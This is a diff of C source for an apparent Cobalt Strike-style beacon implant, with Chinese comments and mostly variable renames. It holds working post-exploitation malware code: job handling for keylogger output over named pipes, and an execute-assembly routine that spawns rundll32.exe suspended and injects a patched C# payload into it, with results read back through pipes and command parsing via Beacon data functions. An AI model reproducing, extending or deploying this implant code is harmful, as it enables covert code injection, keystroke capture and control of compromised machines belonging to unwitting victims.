@@ -5,12 +5,12 @@
 
 JOB_ENTRY* gJobs = NULL;
 
-JOB_ENTRY* JobAdd(JOB_ENTRY* newJob)
+JOB_ENTRY* JobAdd(JOB_ENTRY* new_job)
 {
 	static DWORD gJobCurrentId = 0;
 
 	JOB_ENTRY* job = gJobs;
-	newJob->id = gJobCurrentId++;
+	new_job->id = gJobCurrentId++;
 
 	// 放在链表末尾
 	if (job)
@@ -18,11 +18,11 @@ JOB_ENTRY* JobAdd(JOB_ENTRY* newJob)
 		while (job->next)
 			job = job->next;
 
-		job->next = newJob;
+		job->next = new_job;
 	}
 	else
 	{
-		gJobs = newJob;
+		gJobs = new_job;
 	}
 
 	return job;
@@ -49,28 +49,28 @@ void JobCleanup()
 		}
 	}
 
-	JOB_ENTRY* prev = NULL;
-	JOB_ENTRY** pNext;
-	for (JOB_ENTRY* job = gJobs; job; job = *pNext)
+	JOB_ENTRY* pre_job = NULL;
+	JOB_ENTRY** pnext_job;
+	for (JOB_ENTRY* job = gJobs; job; job = *pnext_job)
 	{
 		if (!job->isDead)
 		{
-			prev = job;
-			pNext = &job->next;
+			pre_job = job;
+			pnext_job = &job->next;
 			continue;
 		}
 
-		if (prev)
-			pNext = &prev->next;
+		if (pre_job)
+			pnext_job = &pre_job->next;
 		else
-			pNext = &gJobs;
+			pnext_job = &gJobs;
 
-		*pNext = job->next;
+		*pnext_job = job->next;
 		free(job);
 	}
 }
 
-JOB_ENTRY* JobRegisterPipe(HANDLE hRead, int pid32, int callbackType, unsigned char* description, BOOL isMsgMode)
+JOB_ENTRY* JobRegisterPipe(HANDLE hRead, int pid32, int callback_type, unsigned char* description, BOOL isMsgMode)
 {
 	JOB_ENTRY* job = (JOB_ENTRY*)malloc(sizeof(JOB_ENTRY));
 	if (!job) {
@@ -84,7 +84,7 @@ JOB_ENTRY* JobRegisterPipe(HANDLE hRead, int pid32, int callbackType, unsigned c
 	job->hRead = hRead;
 	job->isPipe = TRUE;
 	job->pid32 = pid32;
-	job->callbackType = callbackType;
+	job->callbackType = callback_type;
 	strncpy(job->description, description, sizeof(job->description));
 
 	return JobAdd(job);
@@ -149,10 +149,10 @@ DWORD JobReadDataFromPipe(HANDLE hPipe, unsigned char* buffer, int size)
 	return totalRead;
 }
 
-DWORD JobReadDataFromPipeWithHeader(HANDLE hPipe, unsigned char* buffer, int size)
+DWORD JobReadDataFromPipeWithHeader(HANDLE hPipe, unsigned char* buffer, int max)
 {
 	DWORD lpTotalBytesAvail;
-	DWORD headerSize = 0;
+	DWORD get_size = 0;
 
 	if (!PeekNamedPipe(hPipe, NULL, 0, NULL, &lpTotalBytesAvail, NULL)) {
 		fprintf(stderr, "PeekNamePipe failed with error:%lu\n", GetLastError());
@@ -160,24 +160,25 @@ DWORD JobReadDataFromPipeWithHeader(HANDLE hPipe, unsigned char* buffer, int siz
 	}
 
 	if (!lpTotalBytesAvail) {
-		fprintf(stdout, "No data available in pipe\n");
+		return 0;
 	}
 
 	// 先从管道读取大小
-	if (ProtocolSmbPipeRead(hPipe, (unsigned char*)&headerSize, sizeof(headerSize)) != sizeof(headerSize) || headerSize > size) {
+	if (ProtocolSmbPipeRead(hPipe, (unsigned char*)&get_size, 4) != sizeof(get_size) || get_size > max) {
 		fprintf(stderr, "Read header size failed or header size too large than post packet\n");
 		return -1;
 	}
 
-	return ProtocolSmbPipeRead(hPipe, buffer, headerSize);
+	return ProtocolSmbPipeRead(hPipe, buffer, get_size);
 }
 
-int ProtocolSmbPipeRead(HANDLE channel, unsigned char* buffer, int length)
+int ProtocolSmbPipeRead(HANDLE hPipe, unsigned char* buffer, int length)
 {
 	int NumberOfBytesRead, totalRead;
+
 	for (totalRead = 0; totalRead < length; totalRead += NumberOfBytesRead)
 	{
-		if (!ReadFile(channel, buffer + totalRead, length - totalRead, &NumberOfBytesRead, NULL)) {
+		if (!ReadFile(hPipe, buffer + totalRead, length - totalRead, &NumberOfBytesRead, NULL)) {
 			fprintf(stderr, "ReadFile failed with error:%lu\n", GetLastError());
 			return -1;
 		}
@@ -193,67 +194,66 @@ int ProtocolSmbPipeRead(HANDLE channel, unsigned char* buffer, int length)
 }
 
 void ProcessJobEntry(int max) {
-	JOB_ENTRY* tmpJob = gJobs;
+	JOB_ENTRY* global_job = gJobs;
 	/*
 	* 必须为有符号
-	* 在JobReadDataFromPipeWithHeader 
-	* JobReadDataFromPipe 中 直接返回了 -1 无符号表示为0xFFFFFFFF
+	* 在JobReadDataFromPipeWithHeader 和
+	* JobReadDataFromPipe 中直接返回了 -1 无符号表示为0xFFFFFFFF
 	* 判断 totalRead 就会大于 0
 	* 传入到 DataProcess 中就为 0xFFFFFFFF 
 	* 从而在 DataProcess 引发访问边界错误
 	*/
 	int totalRead = 0;
-	unsigned char* buf = NULL;
+	unsigned char* buffer = NULL;
 
 	// 没有注册的 Job
-	if(tmpJob == NULL)
+	if(global_job == NULL)
 		return;
 
-	buf = (unsigned char*)malloc(sizeof(unsigned char) * max);
+	buffer = (unsigned char*)malloc(sizeof(unsigned char) * max);
 
-	while (tmpJob) {
-		// 判断数据类型
+	while (global_job) {
 		/*
-		* JOB_MODE_MESSAGE 指的是读取带有头部长度的消息
+		* JOB_MODE_MESSAGE 指的是读取带有头部长度的消息(keylogger、keylogger)
 		* 每次读取的是一个固定大小
 		*/
+
 		/*
-		* JobReadDataFromPipe对应的读取方式为字节流(stream) 有多少读多少
+		* JOB_MODE_BYTE 对应的读取方式为字节流有多少读多少(execute-assembly)
 		*/
-		if (tmpJob->isMsgMode == JOB_MODE_MESSAGE) {
-			totalRead = JobReadDataFromPipeWithHeader(tmpJob->hRead, buf, max);
+		if (global_job->isMsgMode == JOB_MODE_MESSAGE) {
+			totalRead = JobReadDataFromPipeWithHeader(global_job->hRead, buffer, max);
 		}
 		else {
-			totalRead = JobReadDataFromPipe(tmpJob->hRead, buf, max);
+			totalRead = JobReadDataFromPipe(global_job->hRead, buffer, max);
 		}
 
 		if (totalRead > 0) {
-			DataProcess(buf, totalRead, tmpJob->callbackType);
+			DataProcess(buffer, totalRead, global_job->callbackType);
 		}
 
 		// 判断是否有 Die 的进程
-		if (tmpJob->isPipe == JOB_ENTRY_NAMEDPIPE && totalRead == -1) {
-			tmpJob->isDead = JOB_STATUS_DEAD;
+		if (global_job->isPipe == JOB_ENTRY_NAMEDPIPE && totalRead == -1) {
+			global_job->isDead = JOB_STATUS_DEAD;
 		}
-		else if(tmpJob->isPipe == JOB_ENTRY_PROCESS && WaitForSingleObject(tmpJob->process, 0) != WAIT_TIMEOUT) {
-			tmpJob->isDead = JOB_STATUS_DEAD;
+		else if(global_job->isPipe == JOB_ENTRY_PROCESS && WaitForSingleObject(global_job->process, 0) != WAIT_TIMEOUT) {
+			global_job->isDead = JOB_STATUS_DEAD;
 		}
-		if (tmpJob->isMsgMode == JOB_MODE_MESSAGE && totalRead > 0) {
+		if (global_job->isMsgMode == JOB_MODE_MESSAGE && totalRead > 0) {
 
 		}
 		else {
-			tmpJob = (JOB_ENTRY*)tmpJob->next;
+			global_job = (JOB_ENTRY*)global_job->next;
 		}
 	} 
 
-	free(buf);
+	free(buffer);
 	JobCleanup();
 }
 
-unsigned char* CmdJobList(size_t* msgLen) {
+unsigned char* CmdJobList(size_t* post_length) {
 	formatp format;
 	BeaconFormatAlloc(&format, 0x8000);
-
 
 	for (JOB_ENTRY* job = gJobs; job; job = job->next)
 	{
@@ -261,25 +261,25 @@ unsigned char* CmdJobList(size_t* msgLen) {
 	}
 
 	int size = BeaconDataLength(&format);
-	unsigned char* buffer = BeaconDataOriginal(&format);
-	*msgLen = size;
-	unsigned char* postMsg = (unsigned char*)malloc(size + 1);
-	if (!postMsg) {
+	unsigned char* original = BeaconDataOriginal(&format);
+
+	*post_length = size;
+	unsigned char* post_buffer = (unsigned char*)malloc(size);
+	if (!post_buffer) {
 		fprintf(stderr, "Memory allocation failed\n");
 		return NULL;
 	}
-	memcpy(postMsg, buffer, size);
-	postMsg[size] = '\0';
+	memcpy(post_buffer, original, size);
 
 	BeaconFormatFree(&format);
 
-	return postMsg;
+	return post_buffer;
 }
 
-unsigned char* CmdJobKill(unsigned char* command, size_t command_length, size_t* msgLength) {
+unsigned char* CmdJobKill(unsigned char* command_buffer, size_t command_length, size_t* post_length) {
 	datap parser;
-	BeaconDataParse(&parser, command, command_length);
-	WORD id = BeaconDataShort(&parser);
+	BeaconDataParse(&parser, command_buffer, command_length);
+	WORD id = BeaconDataShort(&parser); // job id
 	BOOL Flag = FALSE;
 
 	for (JOB_ENTRY* job = gJobs; job; job = job->next)
@@ -287,50 +287,48 @@ unsigned char* CmdJobKill(unsigned char* command, size_t command_length, size_t*
 		if (job->id == id) {
 			job->isDead = TRUE;
 			Flag = TRUE;
+			JobCleanup();
 		}
 	}
 
-	unsigned char* success = "[*] Kill Job Successed!";
-	unsigned char* fail = "[*] Kill Job Failed!";
-	unsigned char* postMsg;
+	unsigned char* success = "[*] Success!";
+	unsigned char* fail = "[-] Failed!";
+	unsigned char* post_buffer;
+
 	if (Flag) {
-		postMsg = (unsigned char*)malloc(strlen(success));
-		if (!postMsg) {
+		post_buffer = (unsigned char*)malloc(strlen(success));
+		if (!post_buffer) {
 			fprintf(stderr, "Memory allocation failed\n");
 			return NULL;
 		}
-		memcpy(postMsg, success, strlen(success));
-		*msgLength = strlen(success);
-		postMsg[*msgLength] = '\0';
+		memcpy(post_buffer, success, strlen(success));
+		*post_length = strlen(success);
 	}
 	else {
-		postMsg = (unsigned char*)malloc(strlen(fail));
-		if (!postMsg) {
+		post_buffer = (unsigned char*)malloc(strlen(fail));
+		if (!post_buffer) {
 			fprintf(stderr, "Memory allocation failed\n");
 			return NULL;
 		}
-		memcpy(postMsg, fail, strlen(fail));
-		*msgLength = strlen(fail);
-		postMsg[strlen(fail)] = '\0';
+		memcpy(post_buffer, fail, strlen(fail));
+		*post_length = strlen(fail);
 	}
-
-	JobCleanup();
 	
-	return postMsg;
+	return post_buffer;
 }
 
-VOID CmdJobRegister(unsigned char* command, size_t command_length, BOOL impersonate, BOOL isMsgMode)
+VOID CmdJobRegister(unsigned char* command_buffer, size_t command_length, BOOL impersonate, BOOL isMsgMode)
 {
-	char filename[64] = { 0 };
+	char pipe_name[64] = { 0 };
 	char description[64] = { 0 };
 
 	datap parser;
-	BeaconDataParse(&parser, command, command_length);
-	int pid32 = BeaconDataInt(&parser);              // 4 bytes
-	short callbackType = BeaconDataShort(&parser);   // 2 bytes
-	short waitTime = BeaconDataShort(&parser);       // 2 bytes
+	BeaconDataParse(&parser, command_buffer, command_length);
+	int pid32 = BeaconDataInt(&parser);               // 4 bytes   
+	short callback_type = BeaconDataShort(&parser);   // 2 bytes
+	short waite_time = BeaconDataShort(&parser);      // 2 bytes
 
-	if (!BeaconDataStringCopySafe(&parser, filename, sizeof(filename)))
+	if (!BeaconDataStringCopySafe(&parser, pipe_name, sizeof(pipe_name)))
 		return;
 
 	if (!BeaconDataStringCopySafe(&parser, description, sizeof(description)))
@@ -338,7 +336,7 @@ VOID CmdJobRegister(unsigned char* command, size_t command_length, BOOL imperson
 
 	HANDLE hPipe;
 	int attempts = 0;
-	while (!PipeConnectWithToken(filename, &hPipe, impersonate ? 0x20000 : 0))
+	while (!PipeConnectWithToken(pipe_name, &hPipe, impersonate ? 0x20000 : 0))
 	{
 		Sleep(500);
 		if (++attempts >= 20)
@@ -348,36 +346,37 @@ VOID CmdJobRegister(unsigned char* command, size_t command_length, BOOL imperson
 		}
 	}
 
-	if (waitTime)
+	if (waite_time)
 	{
-		PipeWaitForExec(hPipe, waitTime, 500);
+		PipeWaitForExec(hPipe, waite_time, 500);
 	}
 
-	JobRegisterPipe(hPipe, pid32, callbackType, description, isMsgMode);
+	JobRegisterPipe(hPipe, pid32, callback_type, description, isMsgMode);
 }
 
-VOID CmdExecuteAssembly(unsigned char* command, size_t command_length) {
-	// 数据包格式：callbackType(2 Bytes) || waitTime(2 Bytes) || offset(4 Bytes) || description || arguLength(4 Bytes) || argument(arguLength Bytes) || patchDll(patchDllSize Bytes)
+VOID CmdExecuteAssembly(unsigned char* command_buffer, size_t command_length) {
+	// 数据包格式：
+	// callbackType(2 Bytes) || waitTime(2 Bytes) || offset(4 Bytes) || description || arguLength(4 Bytes) || argument(arguLength Bytes) || patchDll(patchDllSize Bytes)
 	datap* desc = BeaconDataAlloc(64);
 	unsigned char* description = BeaconDataPtr(desc, 64);
 
 	datap parser;
-	BeaconDataParse(&parser, command, command_length);
+	BeaconDataParse(&parser, command_buffer, command_length);
 	WORD callbackType = BeaconDataShort(&parser); // 2 Bytes
 	WORD waitTime = BeaconDataShort(&parser);     // 2 Bytes
 	DWORD offset = BeaconDataInt(&parser);        // 4 Bytes
-	DWORD descLength = BeaconDataStringCopySafe(&parser, description, 64);
-	DWORD arguLength = BeaconDataInt(&parser);    // 4 Bytes
-	unsigned char* argument = arguLength ? BeaconDataPtr(&parser, arguLength) : NULL; // Argument Bytes
-	unsigned char* patchCSharp = BeaconDataBuffer(&parser);
-	DWORD patchCSharpSize = BeaconDataLength(&parser);
+	DWORD desc_length = BeaconDataStringCopySafe(&parser, description, 64);
+	DWORD argu_length = BeaconDataInt(&parser);    // 4 Bytes
+	unsigned char* argument = argu_length ? BeaconDataPtr(&parser, argu_length) : NULL;
+	unsigned char* patch_csharp = BeaconDataBuffer(&parser);
+	DWORD patch_csharp_size = BeaconDataLength(&parser);
 
-	JobSpawn(callbackType, waitTime, offset, patchCSharp, patchCSharpSize, argument, arguLength, description, descLength);
+	JobSpawn(callbackType, waitTime, offset, patch_csharp, patch_csharp_size, argument, argu_length, description, desc_length);
 
 	BeaconDataFree(desc);
 }
 
-VOID JobSpawn(WORD callbackType, WORD waitTime, DWORD offset, unsigned char* patchCSharp, DWORD patchCSharpSize, unsigned char* argument, DWORD arguLength, unsigned char* description, DWORD descLength) {
+BOOL JobSpawn(WORD callback_type, WORD wait_time, DWORD offset, unsigned char* patch_csharp, DWORD patch_csharp_size, unsigned char* argument, DWORD argu_length, unsigned char* description, DWORD desc_length) {
 	STARTUPINFOA si = { sizeof(si) };
 	PROCESS_INFORMATION pi = { 0 };
 	SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
@@ -394,15 +393,15 @@ VOID JobSpawn(WORD callbackType, WORD waitTime, DWORD offset, unsigned char* pat
 	unsigned char* spawnProcess = "C:\\Windows\\System32\\rundll32.exe";
 	if (!CreateProcessA(NULL, spawnProcess, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
 		fprintf(stderr, "CreateProcessA failed with error:%lu\n", GetLastError());
-		return;
+		return FALSE;
 	}
 
 	Sleep(100);
-	InjectProcessLogic(&pi, pi.hProcess, pi.dwProcessId, patchCSharp, patchCSharpSize, offset, argument, arguLength);
+	InjectProcessLogic(&pi, pi.hProcess, pi.dwProcessId, patch_csharp, patch_csharp_size, offset, argument, argu_length);
 
 	// 等待 waitTime(默认 2s) 2s 内向管道中取数据
-	if (waitTime) {
-		PipeWaitForExec(hRead, waitTime, 500);
+	if (wait_time) {
+		PipeWaitForExec(hRead, wait_time, 500);
 	}
 
 	JobRegisterProcess(&pi, hRead, hWrite, description);
